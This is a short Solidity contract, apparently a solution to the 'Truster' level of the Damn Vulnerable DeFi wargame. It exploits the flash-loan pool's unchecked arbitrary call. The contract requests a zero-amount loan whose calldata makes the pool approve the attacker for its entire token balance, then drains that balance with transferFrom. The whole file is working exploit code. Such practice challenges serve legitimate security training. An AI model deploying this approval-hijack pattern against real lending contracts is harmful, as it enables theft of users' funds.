// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackTruster {
    
    TrusterLenderPool public pool;
    DamnValuableToken public immutable token;
    address player;
      
    constructor(TrusterLenderPool _pool, DamnValuableToken _token) {
        pool = _pool;
        token = _token;
    }
    
    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        address attacker = msg.sender;
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
            );
        
        pool.flashLoan( 0, attacker, address(token), data);
        token.transferFrom(address(pool), attacker, amount);
    }
    
}
